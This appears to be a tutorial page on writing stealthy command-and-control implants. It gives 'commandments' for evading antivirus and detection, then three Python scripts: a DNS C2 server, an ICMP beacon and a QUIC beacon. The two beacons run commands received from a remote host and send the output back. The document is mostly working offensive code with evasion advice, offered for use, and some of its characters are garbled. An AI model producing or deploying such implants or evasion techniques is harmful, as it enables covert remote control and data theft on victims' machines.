The Stealth Trade-Off
Why "Bad Code" is Better for C2

A software engineer will tell you to add: error handling, retransmission, sequence numbers, connection pooling, logging, graceful degradation.

Don't. Each of those adds:

  • Binary size в†’ more signatures for AV
  • Predictable behavior в†’ easier to fingerprint
  • Strings and error messages в†’ detection surface
  • Memory footprints в†’ anomaly detection

The best implants fail silently, reconnect with jitter, and look like broken software.

OPSEC-Driven Development Rules
The 7 Commandments of Implant Coding
  1. No error messages вЂ“ ever. Fail silently or exit.
  2. No logging вЂ“ nothing written to disk unless required.
  3. Jitter everything вЂ“ sleeps, reconnects, beacon intervals.
  4. Exponential backoff вЂ“ don't hammer failed connections.
  5. Masquerade or stay small вЂ“ either blend in or be invisible.
  6. No unnecessary dependencies вЂ“ static link or pure system calls.
  7. Strings kill вЂ“ XOR or obfuscate any static string.
DNS Tunnel В· Python
#!/usr/bin/env python3
import socket, struct, base64, time, random, threading
DOMAIN, PORT = "c2.yourdomain.com", 53

def build_dns_response(qid, domain, data):
    header = struct.pack('!HHHHHH', qid, 0x8180, 1, 1, 0, 0)
    qparts = domain.encode().split(b'.')
    q = b''.join(bytes([len(p)]) + p for p in qparts) + b'\x00' + struct.pack('!HH', 16, 1)
    a = b''.join(bytes([len(p)]) + p for p in qparts) + b'\xc0\x0c'
    a += struct.pack('!HHI', 16, 1, 60)
    a += struct.pack('!H', len(data) + 1) + bytes([len(data)]) + data.encode()
    return header + q + a

def handle(data, addr, sock):
    qid = struct.unpack('!H', data[:2])[0]
    resp = build_dns_response(qid, "cmd.data", "whoami")
    sock.sendto(resp, addr)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('0.0.0.0', PORT))
print(f"[+] DNS C2 on {PORT}")
while True:
    d, a = sock.recvfrom(512)
    threading.Thread(target=handle, args=(d, a, sock)).start()

#!/usr/bin/env python3
import socket, struct, os, time, random, subprocess, base64
HOST, ID = "c2.yourdomain.com", os.getpid() & 0xFFFF
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
def icmp(data, seq):
    pkt = struct.pack('!BBHHH', 8, 0, 0, seq, ID) + data.encode()[:100]
    s.sendto(pkt, (HOST, 0))
    return s.recvfrom(1024)[0][28:]
while 1:
    r = icmp("BEACON:" + os.uname().nodename, 1)
    if len(r) > 8:
        cmd = r[8:].split(b'\x00',1)[0].decode()
        if cmd and cmd != "ping":
            out = subprocess.getoutput(cmd)
            for i in range(0, len(out), 100): icmp(out[i:i+100], i//100+1)
    time.sleep(30 + random.randint(0, 30))

# pip install aioquic
import asyncio, subprocess, base64, random
from aioquic.asyncio.client import connect
from aioquic.h3.connection import H3Connection
async def beacon():
    async with connect("c2.yourdomain.com", 4433) as conn:
        h3 = H3Connection(conn)
        while True:
            await h3.send_headers([(b":method", b"GET"), (b":path", b"/beacon")])
            data = await h3.receive_data()
            cmd = data.decode()
            if cmd and cmd != "ping":
                out = base64.b64encode(subprocess.getoutput(cmd).encode()).decode()
                await h3.send_headers([(b":method", b"POST"), (b":path", b"/data")])
                await h3.send_data(out.encode())
            await asyncio.sleep(30 + random.randint(0, 30))
asyncio.run(beacon())
